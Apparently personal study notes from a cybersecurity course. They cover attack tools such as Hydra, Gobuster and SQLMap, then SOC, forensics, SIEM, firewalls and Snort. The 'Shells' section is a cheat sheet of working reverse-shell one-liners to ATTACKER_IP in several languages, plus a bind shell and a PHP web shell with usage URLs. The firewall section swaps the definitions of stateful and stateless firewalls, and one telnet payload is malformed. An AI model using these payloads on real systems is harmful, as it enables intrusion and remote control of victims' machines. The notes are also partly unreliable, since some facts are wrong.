
### Commands
Hydra commands follow the following syntax:

**hydra -l [user] -P [passlist.txt] [MACHINE_IP]**

Example SSH

**hydra -l [user] -P [wordlist] [IP_address] -t [x] ssh**

| Option | Description |
| :------: | :-----: |
| -l | specifies the username for login |
| -P | indicates a list of passwords |
| -t | sets the number of threads to spawn |

Example Post Web Form

**hydra -l [username] -P [wordlist] [IP_address] http-post-form "[path]:[login_credentials]:[invalid_response]"**

| Option | Description |
| :------: | :-----: |
| -l | specifies the username for login |
| -P | indicates a list of passwords |
| http-post-form | type of the form |
| [path] | login page of the URL (e.g. login.php) |
| [login_credentials] | username and password to use (e.g. username=^USER^&password=^PASS^) |
| [invalid_response] | part of the response when login fails |
| -V | verbose output for each attempt |

E.g. hydra -l [username] -P [wordlist] [IP_address] http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V

## Gobuster
<i>Gobuster</i> is a reconaissance tool that can be used to enumerate web directories, DNS subdomains, virtual hosts, S3 buckets, and Google Cloud Storage. This utilises brute force using specific wordlists. 

Basic syntax: **gobuster [command] [flags]**

Some commonly used flags include:
| Short Flag | Long Flag | Description |
| :------: | :-----: | :-----: |
| -t | --threads | configures number of threads used |
| -w | --wordlist | configures wordlist to be used |
|  | --delay | defines waiting time between sent requests |
|  | --debug | used for troubleshooting errors |
| -o | --output | writes results to a file |

E.g. gobuster dir -u "http://www.example.thm/" -w /usr/share/wordlists/dirb/small.txt -t 64

### Directory & File Enumeration
Basic syntax: **gobuster dir -d "[http://url]" -w [path_to_wordlist] [flags]**

Some commonly used flags include:
| Short Flag | Long Flag | Description |
| :------: | :-----: | :-----: |
| -c | --cookies | configures a cookie to pass (e.g. session ID) |
| -x | --extensions | specifies a file extension (e.g. .php, .js) |
| -H | --headers | configures an entire header to pass |
| -k | --no-tls-validation | skips certificate checking (i.e. used in CTF events only) |
| -n | --no-status | do not display status codes |
| -P | --password | set with --username for authentication |
| -U | --username | set with --password for authentication |
| -r | --followredirect | follow redirect to a different URL (i.e. 301, 302) |

E.g. gobuster dir -u "http://www.example.thm" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.js

Note: notice that " " are used when using the -u flag

### Subdomain Enumeration
Basic syntax: **gobuster dns -d [domain] -w [path_to_wordlist] [flags]**

Some commonly used flags include:
| Short Flag | Long Flag | Description |
| :------: | :-----: | :-----: |
| -c | --show-cname | display CNAME records |
| -i | --show-ips | displys IP addresses |
| -r | --resolver | configures a custom DNS to use |
| -d | --domain | configures the domain to be enumerated |

### Vhost Enumeration
Basic syntax: **gobuster vhost -u "[http://url] -w [path_to_wordlist] [flags]**

Note: vhost commands are much more complex as more configured flags are used to reflect realistic tests

Some commonly used flags include:
| Short Flag | Long Flag | Description |
| :------: | :-----: | :-----: |
|  | --domain | sets top and second-level domains |
|  | --append-domain | appends the configured domain to each wordlist entry |
|  | --exclude-length | filters responses by size |

E.g. gobuster vhost -u "http://10.10.31.174" --domain example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320 

## Shells
<i>Shells</i> allow users to interact with an OS, usually through a CLI. Attackers use these shells on compromised systems to do execute several activities, which include:
+ Remote system control
+ Privilege escalation
+ Data exfiltration
+ Persistence and maintenance access
+ Post-exploitation
+ Access other systems on the network (i.e. pivoting)

### Reverse Shell
Reverse shells or "connect back shells" initiate a connection from the target system to the attacker's machine, which aids in avoiding detection from network firewalls and other security measures.

The process typically is as follows:

1 - Set up a listener using Netcat 

E.g. nc listener
```
nc -lvnp 443
```
Any port can be used to wait for a connection. Note: known ports (e.g. 53, 80, 8080, 443, 139, 445) tend to be used to blend with legitimate traffic

2- Gaining reverse shell access

Once a listener is set, a rever shell payload is executed. This abuses the vulnerability/unauthorised access granted and executes a command that will expose the shell through the network. [Pentest Monkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) have some examples.

E.g. Pipe rever shell
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc [ATTACKER_IP] [ATTACKER_PORT] >/tmp/f
```

3- Attacker receives shell

Once received, the attacker can execute commands as if they were logging into a regular terminal

### Bind Shell
Bind shells will bind a port on the compromised system and listen for incoming connections. When a connection is made, it exposes a shell session. This method can be used when the compromised target does not allow outgoing connections. Note: this tends to be less popular since it needs to remain active, which increases the chances of detection.

The process typically is as follows:

1- Setting up the bind shell on the target
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```
Once the command is executed, it will wait for an incoming connection.

2- Attacker connects to the bind shell

As the target waits for incoming ocnnections, attackers can use Netcat to connect.
```
nc -nv [TARGET_IP] 8080
```

After connection, a shell is obtained and commands can be executed.

### Web Shells
Web shells are scripts written in a language supported by a compromised web server, which can execute commands through the web server itself. These are usually files containing the code that executes that can be hidden in a compromised web app or service. These can be written in PHP, ASP, JSP, and CGI scripts.

1- Upload web shell file to web server

E.g. simple PHP web shell
```
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

The above shell can be saved in to a file (e.g. shell.php) and then uploaded into the web server that is vulnerable to unrestricted file upload, file inclusion, command injections, etc.

2- Access the shell through URL

Once deployed, the file can be accessed through the URL where the web shell is hoted (e.g. http://victim.com/uploads/shell.php). 

3- Execute commands

For the above example, GET methods and the value of cmd need to be provided (e.g. http://victim.com/uploads/shell.php?cmd=whoami).

Note: there are many popular web shells that can be found online, including:
+ [p0wny-shell](https://github.com/flozz/p0wny-shell)
+ [b374k shell](https://github.com/b374k/b374k)
+ [c99 shell](https://www.r57shell.net/single.php?id=13)

Other can be found on [r57shell.net](https://www.r57shell.net/index.php).

### Other Shell Listeners
Other tools that can be used as listeners include:

<i>Rlwrap</i> - provides editing keyboard and history; wrapping **nc** with **rlwrap** allows the use of arrow keys and history for better interaction

```
rlwrap nc -lvnp 443
```

<i>Ncat</i> - improved version of Netcat; provides extra features such as encryption (i.e. SSL)

```
ncat --ssl -lvnp 4444
```

<i>Socat</i> - allows creation of socket connections between two data sources (e.g. two hosts)

```
socat -d -d TCP-LISTEN:443 STDOUT
```

### Shell Payloads
Shell payloads can be commands or scripts that exposes the shell into incoming connections (i.e. bind shell) or send a connection (i.e. reverse shell).

#### Bash
E.g. Normal bash reverse shell
```
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```
E.g. Bash read line reverse shell
```
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```
E.g. Bash with file descripter 196 reverse shell
```
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```
E.g. Bash with file descripter 5 reverse shell
```
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

#### PHP
E.g. PHP reverse shell using the exec function
```
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```
E.g. PHP reverse shell using the shell_exec function
```
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```
E.g. PHP reverse shell using the system function
```
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
```
E.g. PHP reverse shell using the passthru function
```
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```
E.g. PHP reverse shell using the popen function
```
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
```

#### Python
E.g. Python reverse shell by exporting environmental variables
```
export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```
E.g. Python reverse shell using the subprocess module
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```
E.g. Short Python reverse shell
```
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

#### Others
E.g. Telnet
```
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
```
E.g. AWK
```
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
E.g. BusyBox
```
busybox nc ATTACKER_IP 443 -e sh
```

## SQLMap
<i>SQLMap</i> is an automated tool for detecting and exploiting SQLi vulnerabilities in web apps. 

Basic syntax: **sqlmap -u [GET_URL] [flags]**

Note: GET URLs can be taken from Developer Tools -> Network after sending a sample POST request; add ' ' to URLs to handle special characters (e.g. ?)

Some key information flags to take note of:
+ **--help** - lists all available flags
+ **--wizard** - step-by-step guide to complete a particular scan; useful for beginners

Main SQLi flags include:
+ **--dbs** - extract all database names
+ **-D [database_name]** - select a specific database
+ **--tables** - extract all tables from a database
+ **-T [table_name]** - select a specific table
+ **--dump** - extract all records

E.g. sqlmap -u 'http://sqlmaptesting.thmsearch/cat=1' -D users -T thomas --dump

## SOC
A <i>Security Operations Center (SOC)</i> is a specialised security facility that monitors an organisation's network and resources and identify suspicious activity. Their main focus is to keep detection and response robust

Detection can be in relation to: vulnerabilities, unauthorised activity, policy violations, intrusions. Support often occurs in conjunction with incident response once an incident is detected.

The three pillars of a SOC include: 
+ People (i.e. the SOC team)
+ Process (i.e. alert triage - the 5 Ws, reporting, incident response and forensics)
+ Technology (SIEM, EDR, firewalls, etc)

## Digital Forensics
<i>Digital forensics</i> primarily involve the use of tools and techniques to investigate digital devices to find and analyse evidence for necessary legal action.

### Methodology
The National Institute of Standards and Technology (NIST) introduced four phases for the process of digital forensics. These are:

Collection -> Examination -> Analysis -> Reporting

Note: there are different types of forensics that each have their own collection and analysis methodologies. These include:
+ Computer forensics - primarily investigating computers
+ Mobile forensics - involves investigating mobile devices (i.e. call records, text messages, GPS locations, etc)
+ Network forensics - covers investigation that includes the whole network (i.e. network traffic logs)
+ Database forensics - investigates intrusions into databases (i.e. data modification/exfiltration)
+ Cloud forensics - involve investigating data stored in cloud infrastructure
+ Email forensics - involve investigating this communication method (i.e. phishing, fraud campaigns)

### Notes on Acquiring Evidence
Some general practices to follow while acquiring evidence include:
+ Proper Authorisation - evidence collected without prior approval may be deemed inadmissible in court; the forensics team should obtain authorisation from relevant authorities before collecting any data
+ Chain of Custody - this formal document contains all details of the evidence; this document can be used to prove the integrity and reliability of th evidence in court
+ Write Blockers - using these tools can block any evidence alteration actions

### Notes on Windows Forensics
As part of the data collection phase, forensic images of Windows OS are taken. There are two categories:
+ Disk image - contains all data present on the storage device (i.e. HDD, SSD, etc); data is non-volatile (i.e. remains after restart)
+ Memory image - contains data in RAM; data is volatile (i.e. lost after restart)

Some tools for disk and memory image acquisition and analysis include:
+ FTK Imager - widely used for creating disk images
+ [Autopsy](https://www.autopsy.com/) - imported disk images can be analysed; features include keyword search, deleted file recovery, file metadata, extension mismatch detection, etc
+ [Dumpit](https://www.toolwar.com/2014/01/dumpit-memory-dump-tools.html) - creates memory images using CLI
+ [Volatility](https://volatilityfoundation.org/) - open-source tool for analysing memory images; this supports Windows, Linux, macOS, and Android

### Notes on File Metadata
Text files contain metadata. These include exported pdf files. To read the metadata, **pdfinfo** can be used. The extracted metadata include title, subject, author, creator, and creation date.

Basic syntax: **pdfinfo [document.pdf]**

Image files have Exchangeable Image File Format (EXIF) metadata. These can include data on camera/smartphone model, date and time of capture, GPS coordinates (i.e. for smartphones) photo settings such as focal length, aperture, shutter speed, and ISO. The program **exiftool** can be used to read and write metadata in images.

Basic syntax: **exiftool [image.jpg]**

## Incident Response
<i>Incident response (IR)</i> handles incidents from start to end. Incidents are true positive alerts, which are given a severity level. These can be categorised into different types:
+ Malware infections
+ Security breaches (i.e. unauthorised access)
+ Data leaks
+ Insider attacks
+ DoS attacks

### IR Process
Two widely used incident response frameworks are used: SANS and NIST.

The SANS framework has six phases, known as PICERL:
1. Preparation
2. Identification
3. Containment
4. Eradication
5. Recovery
6. Lessons Learned

The NIST framework has four phases:
1. Preparation
2. Detection and Analysis
3. Containment, Eradication, and Recovery
4. Post-Incident Activity

Each of these process has a formal document listing all relevant organisational procedures called an <i>incident response plan</i>. Key components of this plan include:
+ Roles and responsibilities
+ Incident response methodology
+ Communication plan with stakeholders
+ Escalation path to be followed

### IR Techniques
Multiple security solutions can aid in the various phases of the IR process (i.e. identification, containment, detection and analysis). These include:
+ SIEM - collects all important logs in one centralised location and correlates them to identify incidents
+ AV - detects known malicious programs in a system and scans the system for them
+ EDR - deployed on every system to contain and eradicate advanced-level threats

After identification, certain procedures must be followed. The following can be used for different kinds of incidents:
+ <i>Playbooks</i> - guidelines for a comprehensive incident response
+ <i>Runbooks</i> - detailed step-by-step methodology during incidents

## Logs
<i>Logs</i> are digital footprints left behind by activities, whether they are intended or malicious. These play an important role in the following areas:
+ Security Events Monitoring - detecting anomalous behaviour in real-time
+ Incident Investigation and Forensics - offers detailed information and traces to the root cause of incidents
+ Troubleshooting - documents errors in systems/applications for diagnosis and fixing
+ Performance Monitoring - provide insights into application performance
+ Auditing and Compliance - establishes a trail for activities

Logs can be grouped into multiple categories, depending on their information. These include:
| Log Type | Usage | Examples |
| :------: | :-----: | :-----: |
| System Logs | used in troubleshooting OS issues | System Startup, Driver Loading, System Error, Hardware events |
| Security Logs | detect and investigate security-related activities | Authentication, Authorisation, Security Policy changes, User Account changes events |
| Application Logs | records application-specific events | User Interaction, Application Changes, Application Update, Application Error events |
| Audit Logs | provides information on system changes and user events | Data Access, System Change, User Activity, Policy Enforcement events |
| Network Logs | details outgoing and incoming network traffic | Incoming/Outgoing Network Traffic, Firewall logs |
| Access Logs | details information about access to different resources | Webserver Access, Database Access, Application Access, API Access logs |

### E.g. Windows Event Logs
In Windows systems, <i>Event Viewer</i> provides a GUI tool to view and search for logs. These logs typically include these fields:
+ Description
+ Log Name
+ Logged
+ Event ID

Event IDs can be used to search for a specific activity. Refer to the table below for some important IDs:
| Event ID | Description |
| :------: | :-----: |
| 4624 | Sucessful log in byuser |
| 4625 | Failed login by user |
| 4634 | Sucessful logout by user |
| 4720 | User account created |
| 4724 | Attempted password reset |
| 4722 | User account enabled |
| 4725 | User account disabled |
| 4726 | User account deleted |

Note: these event IDs can be used for filtering logs

### E.g. Linux Webserver Access Logs
These kinds of logs contain all requests made to the website. Information such as timeframe, IP requested, type, and URL are included. These can be found in the directory: <i>/var/log/apache2/access.log</i>

Some manual analysis commands:
+ **cat [file.log]**
+ **cat [file1.log] [file2.log] > [combined.log]**
+ **grep "[search_keyword]" [file.log]**
+ **less [file.log]** - separates log file into chunks (i.e. page at a time); use spacebar to move to next page, b to previous page; type / then pattern to search; use n to navigate to next occurence of search, N to navigate to the previous occurrence

## SIEM
<i>Security Information and Event Management System (SIEM)</i> is a tool that collects data from various endpoints across the network to a centralised location and performs correlation.

SIEMs have the advantage of taking these logs from various sources but also provides an abilityo to correlate between events, search through logs, investigate incidents, and respond appropriately. Some key features include:
+ Real-time log ingestion
+ Alerting on anomalous activities
+ 24/7 monitoring and visibility
+ Threat protection through early detection
+ Data insights and visualisation
+ Investigate past incidents

### Log Sources
Remember that there are different types of log sources
+ Host-Centric Log Sources - capture events that occurred within or related to a host (e.g. Windows Event logs, Sysmon, Osquery, etc)
+ Network-Centric Log Sources - generated when hosts communicate with each other or through the internet (e.g. SSH, VPN, HTTP/s, FTP, etc)

For Windows, <i>Event Viewer</i> is the main tool where different logs are stored and viewed. These logs are forwarded to the SIEM for better monitoring and visibility.

For Linux, common locations for log storage include:
+ <i>/var/log/httpd</i> - contains HTTP request/reponse and error logs
+ <i>/var/log/apache</i> - contains apache related logs
+ <i>/var/log/cron</i> - stores cron jobs events
+ <i>/var/log/auth.log</i> and <i>/var/log/secure</i> - stores authentication logs
+ <i>/var/log/kern</i> - stores kernel related events

### Log Ingestion
Each SIEM has its own way of ingesting logs. Common methods include:
+ Agent/Forwader - a tool by Splunk that is installed in the endpoint that configures them to capture all important logs and send them to the SIEM server
+ Syslog - protocol to collect data from various systems (e.g. webservers, databases) and sent in real-time to a centralised destination
+ Manual Upload - some solutions (i.e. Splunk, ELK) allow offline data ingestion
+ Port-Forwarding - listens on a certain port, and endpoints forward the data to the SIEM on the listening port

### Log & Alert Analysis
Dashboards are the most important components of the SIEM as they present data for analysis after normalisation and ingestion. Some information that are summarised include:
+ Alert highlights
+ System notifications
+ Health alerts
+ List of failed login attempts
+ Events ingested count
+ Rules triggered
+ Top domains visited

Correlation rules are logical expressions that are set to be triggered if met. These allow timely detection of threats. Some examples include:
+ If the Log source is WinEventLog AND EventID is 104 - Trigger an alert Event Log Cleared
+ If Log Source is WinEventLog AND EventCode is 4688, and NewProcessName contains whoami, then Trigger an ALERT WHOAMI command Execution DETECTED

Analysts spend most of their time on the dashboards, watching for triggers. Once an alert is triggered, the events/flows associated are examined, while the rule is checked to see which conditions are met. This process can be broken down as follows:
1. If alert is a False Alarm, which may required tuning of the rule; if alert is a True Positive, perform further investigation.
2. Contact asset owner to inquire about the activity.
3. If suspicious activity is confirmed, isolate the infected host.
4. Block the suspicious IP.

## Firewalls
A <i>firewall</i> inspects a network/device's incoming and outgoing traffic, which then allows or denies based on specific rules. 

Firewalls can be cateogrised into different types:
+ Stateful - determines the behaviour of a device based on the entire connection; filters the data based on predetermined rules, without considering the state of previous connections; operates at OSI layer 3 and 4
+ Stateless - determines whether individual packets are acceptable or not; keeps track of previous connections and stores them in a state table; operates at OSI layer 3 and 4
+ Proxy - act as intermediaries between private networks and the Internate; inspects the content of packets and apply content filtering; operates at the OSI layer 7
+ Next-Generation (NGFW) - offers deep packet inspection, IPS, heuristic analysis, SSL/TLS decryption; operates at OSI layer 3 to 7

An administrator can permit or deny traffic based on these factors:
+ Source of traffic
+ Destination of traffic
+ Destination port
+ Protocol being used
+ Direction

Three actions can be applied to firewall rules:
+ Allow - permit traffic
+ Deny - block traffic
+ Forward - redirects traffic to a different network segment

Rules can be categorised by direction:
+ Inbound - incoming traffic
+ Outbound - outgoing traffic
+ Forward - forward traffic inside a network

### E.g. Windows Defender Firewall
<i>Windows Defender Firewall</i> can create rules that can restrict incoming and outgoing network traffic. 

There are two available network profiles:
+ Private networks - includes configurations to apply when connected to home networks
+ Guest or public networks - includes configurations to apply when connected to public or untrusted networks (e.g. coffee shops, free Wi-Fi)

Custom rules can be created in Advanced Settings.

### E.g. Linux iptables Firewall
For Linux, there are multiple fire wall options available.

<i>Netfilter</i> is the framework within Linux OS with core firewall functionalities (i.e. packet filtering, NAT, connection tracking). Some common firewall utilities include:
+ iptables - most widely used utility
+ nftables - successor to iptables with enhanced packet filtering and NAT capabilities
+ firewalld - has predefined rule sets

<i>Uncomplicated Firewall (ufw)</i> provides an easier interface (i.e. easier commands). Common commands include:
+ **sudo uft status** - check firewall status; add **numbered** to list down all active rules
+ **sudo ufw enable** - enable firewall; use **disable** to disable
+ **sudo ufw default allow outgoing** - allow outgoing connections as a default policy; use **incoming** for inbound connections
+ **sudo ufw deny 22/tcp** - block tcp port 22; switch port and transport protocol as needed
+ **sudo ufw delete 2** - delete a specific rule (i.e. based from numbers from sudo uft status numbered)

## IDS
<i>Intrustion Detection Systems (IDS)</i> monitors for abnormal traffic and notifies security administrators. 

These can be deployed in two ways:
+ Host Intrusion Detection System (HIDS) - installed individually and detects threats on a particular host; provide visibility on host's activities
+ Network Intrusion Detection System (NIDS) - detecting threats within the whole network; provides a centralised view of all network detections

IDS can classified into different detection modes:
+ Signature-based - attacks are detected by their signature/pattern, which are saved in the IDS database; not particularly useful for zero-day attacks
+ Anomaly-based - compares abnormal activity from a normal/baseline behaviour of a network or system; can detect zero-day attacks; prone to generate false positives
+ Hybrid - combines the detection methods (i.e. signature and anomly-based)

### E.g. Snort
<i>Snort</i> is an open-source IDS that uses signature- and anomaly-based threat detection. Several built-in tools come pre-installed with the tool. Custom rules can also be made depending on requirements. 

Snort has several modes:
+ Packet sniffer mode - reads and displays network packets without performing analysis; can be helpful in network monitoring and troubleshooting (i.e. diagnosing issues)
+ Packet logging mode - detects real-time network traffic and displays them as alerts for security administrators; also allows packet logging as PCAP files for offline analysis
+ Network Intrusion Detection System mode - primary mode that monitors network traffic in real-time and applies rule files to identify and match traffic to known attack patterns; successful matches will generate alerts

Snort built-in rules, configuration, and other files can be found in /<i>etc/snort</i> directory. The <i>snort.conf</i> file is particularly useful for rule enabling and network range configuration settings. The <i>rules</i> folder contains the rule files.

#### Rule Creation
Rules follow a specific format: [action] [protocol] [source_ip] [source_port] -> [destination_ip] [destination port] rule_metadata([msg; sid, rev])
+ action - specifies which action to take (e.g. alert)
+ protocol - refers to the protocol that matches the rule (e.g. ICMP)
+ source ip/port - determine the IP/port from which the traffic originates (e.g. any)
+ destination ip/port - specifies the destination IP/port to which the traffic goes to
+ rule metadata - defined with the following components:
  + msg - describes message to be displayed when rule is triggered (e.g. "Ping detected")
  + sid - unique identifier
  + rev - revision number of the rule

E.g. alert icmp any any -> 127.0.0.1 any (msg:"Loopback Ping Detected"; sid:10003; rev:1;)

#### Rule Testing
The following example command tests alerting for ICMP packets to the loopback address:
```
sudo snort -q -l /var/log/snort -i lo -A console -c /etc/snort/snort.conf
```
Commands such as these can also be used for PCAP files:
```
sudo snort -q -l /var/log/snort -r Task.pcap -A console -c /etc/snort/snort.conf
```

## Vulnerability Scanning
<i>Vulnerabilities</i> are weaknesses in software programs or hardware that can be leveraged by attackers. <i>Patching</i> is the process of fixing these vulnerabilities.

However, these vulnerabilities must be scanned for. These scans can be categorised into the following:
+ Authenticated vs Unauthenticated Scans

| Authenticated | Unauthenticated |
| :------: | :-----: |
| Credentials must be provided to the scanner | Only IP address is needed |
| Exploited by attackers that have access to the host | Exploited by attackers that have no access to the host |
| Provides deeper visibility to the target system by scanning configurations and installed applications | Less resource-intensive and easy to configure |
| E.g. providing internal database credentials to scanner | E.g. scanning a public-facing website for vulnerabilities |
+ Internal vs External Scans

| Internal | External |
| :------: | :-----: |
| Conducted from inside the network | Conducted from the outside of the network |
| Focuses on vulnerabilities to be exploited inside the network | Focuses on vulnerabilities to be exploited from outside the network |
| Identifies vulnerabilities once an attacker gets inside a network | Identifies vulnerabilities for attackers outside the network |

Some vulnerability tools include:
+ [Nessus](https://www.tenable.com/products/nessus) - provides extensive vulnerability scanning options for large enterprises; has both free and paid versions
+ [Qualys](https://www.qualys.com/) - provides compliance checks and asset management along with continuous scanning; cloud-based
+ [Nexpose](https://www.rapid7.com/products/nexpose/) - continuously discovers new network assets, scans them, and provides a vulnerability risk score; also provides compliance checks; offers on-premises and hybrid (i.e. cloud + on-premises) deployment
+ [OpenVAS](https://www.openvas.org/) - offers basic features with known vulnerabilities scanned through its database; less extensive but is beneficial for small organisations and invidivudal systems

### CVE
<i>Common Vulnerabilities and Exposures (CVE)</i> is a unique identifier given to software vulnerabilities. Developed by the MITRE Corporation, these CVE numbers are published online in a database. 

E.g. CVE-2024-9374
+ CVE prefix - each CVE has "CVE" in the beginning
+ Year - contains the year it was discovered
+ Arbitrary digits - contains four or more arbitrary digits

### CVSS
<i>Common Vulnerability Scoring System (CVSS)</i> is a score that provide the severity of a vulnerability. It is calculated by factoring its impact, easy of exploitability, etc.

A summary of scores is as follows:

| CVSS Range | Severity Level |
| :------: | :-----: |
| 0.0 to 3.9 | Low |
| 4.0 to 6.9 | Medium |
| 7.0 to 8.9 | High |
| 9.0 to 10 | Critical |

### E.g. Scanning w/ OpenVAS
Install OpenVAS using Docker.
```
sudo apt install docker.io
```
```
sudo docker run -d -p 443:443 --name openvas mikesplain/openvas
```
Access OpenVAS through the browser at <i>https://127.0.0.1</i>


